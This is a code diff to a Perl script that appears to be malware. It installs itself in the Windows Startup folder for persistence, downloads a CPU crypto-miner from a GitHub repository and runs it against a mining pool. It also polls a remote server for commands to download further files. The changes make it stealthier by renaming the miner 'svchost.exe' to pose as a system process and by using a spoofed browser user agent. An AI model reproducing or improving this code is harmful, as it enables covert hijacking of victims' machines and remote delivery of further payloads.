@@ -104,27 +104,23 @@ use Config;
 ### Modules ###
 
 while(1){
-  my $check = qx/dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup/;
-  while($check !~ basename($0)){
+  while(qx/dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup/ !~ basename($0)){
     system(\'copy \' . basename($0) . \' %AppData%\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\');
-    $check = qx/dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup/;
   }
-  $check = qx/dir %AppData%/;
-  while($check !~ m/NsCpuCNMiner\.exe/){
+  while(qx/dir %AppData%/ !~ "svchost.exe"){
     if($Config{archname} =~ /x86_64/ || $Config{archname} =~ /x64/){
-      getstore(\'http://github.com/HatsuZ/BitMiner-v3/blob/master/NsCpuCNMiner64.exe?raw=true\', \'NsCpuCNMiner.exe\');
+      getstore(\'https://github.com/HatsuZ/BitMiner-v3/blob/master/NsCpuCNMiner64.exe?raw=true\', \'svchost.exe\');
     }else{
-      getstore(\'http://github.com/HatsuZ/BitMiner-v3/blob/master/NsCpuCNMiner32.exe?raw=true\', \'NsCpuCNMiner.exe\');
+      getstore(\'https://github.com/HatsuZ/BitMiner-v3/blob/master/NsCpuCNMiner32.exe?raw=true\', \'svchost.exe\');
     }
-    if(-e \'NsCpuCNMiner.exe\'){
-      system(\'move NsCpuCNMiner.exe %AppData%\');
+    if(-e \'svchost.exe\'){
+      system(\'move svchost.exe %AppData%\');
     }
-    $check = qx/dir %AppData%/;
   }
-  my $get = LWP::UserAgent->new; $get->agent(\'Mozilla/5.0\');
+  my $get = LWP::UserAgent->new; $get->agent(\'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\');
   my $res = $get->get(\'', $_[0], '\');
   if($res->decoded_content =~ m/miner\[(.+),(.+)\]/){
-    system("cd %AppData% && NsCpuCNMiner.exe -o stratum+tcp://$1 -u $2 -p x");
+    system("cd %AppData% && svchost.exe -o stratum+tcp://$1 -u $2 -p x");
   }
   if($res->decoded_content =~ m/download\[(.+),(.+),(.+)\]/){
     getstore($1, $2);
